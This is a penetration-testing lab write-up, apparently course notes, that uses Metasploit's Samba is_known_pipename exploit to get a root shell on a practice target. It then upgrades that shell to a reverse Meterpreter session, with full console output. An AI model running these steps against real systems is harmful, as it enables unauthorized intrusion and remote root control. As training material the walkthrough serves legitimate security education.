---
layout: post
title: "Upgrading Command Shells To Meterpreter Shells"
date: "2023-02-09"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Upgrading Command Shells To Meterpreter Shells（将 Command Shell 升级到 Meterpreter Shell）
# Demo: Upgrading Command Shells To Meterpreter Shells （演示：将命令 Shell 升级为 Meterpreter Shell）
We are going to be exploring the process of how you can upgrade a standard command shell into a Meterpreter shell.

```
ifconfig
eth1: inet 192.136.51.2
```

Target IP Address: 192.136.51.3

We can run a second command using the two of the ampersand symbols. Run both of these commands together.

```
service postgresql start && msfconsole
```

Create a workspace.

```
workspace -a upgrading_shells
```

```
setg RHOSTS 192.136.51.3
```

We now need to gain access to the target system. So the first step will involve performing an Nmap scan on the target system.

And we will utilize the `db_nmap` command to perform the Nmap scan from within MSF console, which will consequently save the Nmap scan results into the MSF database.

`-sV`: Perform some service detection on the target.

```
db_nmap -sV 192.136.51.3
```

[Samba is_known_pipename() Arbitrary Module Load](https://www.rapid7.com/db/modules/exploit/linux/samba/is_known_pipename/)

This exploit module allow us to upload an shard object or a shared library.

```
search type:exploit samba
use exploit/linux/samba/is_known_pipename
show options
run 
```

This is a typical Linux command shell.

```
ls
pwd
/bin/bash -i
```

Put this in the background using the `Ctrl+z` keyboard combination. 

```
sessions
```

We can upgrade this particular command shell session into a Meterpreter shell through the use, firstly, of a post-exploitation module.

```
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set SESSION 1
set LHOST eth1
run
```

That will upgrade the command shell into a Meterpreter session.

```
sessions
sessions 2
exit
```

I'm going to exit or close this particular Meterpreter session. `exit` will kill the Meterpreter session.

How we can shave off that entire process of utilizing a post-exploitation module.

```
sessions -h
```

[MSFCONSOLE COMMANDS](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)

```
msf > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:
    -u   Upgrade a shell to a meterpreter session on many platforms
    -u 在许多平台上将 shell 升级为 meterpreter 会话
```

```
sessions -u 1
```

```
sessions
sessions 3
meterpreter > sysinfo
meterpreter > getuid # Get the current user id that we currently have access to.
```

That is the process of upgrading your command shell into a Meterpreter session. And the reason this is important, as we explored earlier during the exploitation section, is because some exploit modules may not support the ability to pair a Meterpreter payload to begin with. The only way to gain initial access is through a command shell. And once you've gained initial access and established a command shell session, you can then upgrade it either through mannually loading the `shell_to_meterpreter` post-exploitation module, or you can automate that process through the `sessions` command.

# Upgrading Command Shells To Meterpreter Shells
## Overview
Goal

This lab covers the process of upgrading a command shell to a meterpreter session.

```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.195.144.2  netmask 255.255.255.0  broadcast 192.195.144.255
        ether 02:42:c0:c3:90:02  txqueuelen 0  (Ethernet)
```

Target IP Address: 192.195.144.3

```
root@attackdefense:~# service postgresql start && msfconsole -q
[ ok ] Starting PostgreSQL 11 database server: main.
msf5 > workspace -a upgrading_shells
[*] Added workspace: upgrading_shells
[*] Workspace: upgrading_shells
msf5 > setg RHOSTS 192.195.144.3
RHOSTS => 192.195.144.3
msf5 > db_nmap -sV 192.195.144.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-02-09 14:21 UTC
[*] Nmap: Nmap scan report for target-1 (192.195.144.3)
[*] Nmap: Host is up (0.0000090s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT    STATE SERVICE     VERSION
[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: MAC Address: 02:42:C0:C3:90:03 (Unknown)
[*] Nmap: Service Info: Host: VICTIM-1
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
msf5 > services
Services
========

host           port  proto  name         state  info
----           ----  -----  ----         -----  ----
192.195.144.3  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
192.195.144.3  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
```

```
msf5 > search Samba

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   9   exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
```

```
msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS          192.195.144.3    yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf5 exploit(linux/samba/is_known_pipename) > run

[*] 192.195.144.3:445 - Using location \\192.195.144.3\exploitable\tmp for the path
[*] 192.195.144.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.195.144.3:445 - Share 'exploitable' has server-side path '/
[*] 192.195.144.3:445 - Uploaded payload to \\192.195.144.3\exploitable\tmp\djwwRwAC.so
[*] 192.195.144.3:445 - Loading the payload from server-side path /tmp/djwwRwAC.so using \\PIPE\/tmp/djwwRwAC.so...
[-] 192.195.144.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.195.144.3:445 - Loading the payload from server-side path /tmp/djwwRwAC.so using /tmp/djwwRwAC.so...
[+] 192.195.144.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.195.144.2:45931 -> 192.195.144.3:445) at 2023-02-09 14:26:19 +0000
```

```
ls
pwd
/tmp
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/tmp# ^Z
Background session 1? [y/N]  y
```

```
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.195.144.2:45931 -> 192.195.144.3:445 (192.195.144.3)
```

```
msf5 exploit(linux/samba/is_known_pipename) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   1  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(linux/samba/is_known_pipename) > use post/multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set LHOST eth1
LHOST => 192.195.144.2
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
```

```
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.195.144.2:4433 
[*] Sending stage (985320 bytes) to 192.195.144.3
[*] Meterpreter session 2 opened (192.195.144.2:4433 -> 192.195.144.3:35964) at 2023-02-09 14:34:31 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         shell cmd/unix                                                       192.195.144.2:45931 -> 192.195.144.3:445 (192.195.144.3)
  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.195.144.3  192.195.144.2:4433 -> 192.195.144.3:35964 (192.195.144.3)

msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.195.144.3 - Meterpreter session 2 closed.  Reason: User exit
```

```
msf5 post(multi/manage/shell_to_meterpreter) > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:
    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
```

```
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.195.144.2:45931 -> 192.195.144.3:445 (192.195.144.3)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.195.144.2:4433 
[*] Sending stage (985320 bytes) to 192.195.144.3
[*] Meterpreter session 3 opened (192.195.144.2:4433 -> 192.195.144.3:46954) at 2023-02-09 14:38:54 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         shell cmd/unix                                                       192.195.144.2:45931 -> 192.195.144.3:445 (192.195.144.3)
  3         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.195.144.3  192.195.144.2:4433 -> 192.195.144.3:46954 (192.195.144.3)
```

```
msf5 post(multi/manage/shell_to_meterpreter) > sessions 3
[*] Starting interaction with 3...

meterpreter > sysinfo
Computer     : 192.195.144.3
OS           : Debian 8.11 (Linux 5.4.0-125-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
```